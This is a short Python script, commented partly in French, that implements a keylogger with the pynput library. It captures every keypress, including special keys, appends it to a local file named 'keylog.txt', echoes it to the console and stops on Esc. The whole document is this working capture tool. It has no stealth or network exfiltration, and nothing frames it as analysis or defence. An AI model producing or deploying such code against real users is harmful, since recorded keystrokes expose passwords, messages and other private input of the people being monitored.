from pynput import keyboard

def on_press(key):
    try:
        # Record normal keys
        print(f"Key pressed: {key.char}")
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Enregistre les touches spéciales (comme Shift, Ctrl, etc.)
        print(f"Touche spéciale pressée: {key}")
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Arrête le keylogger si la touche 'Echap' est pressée
        print("Keylogger arrêté.")
        return False

# Démarre l'écoute des frappes au clavier
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()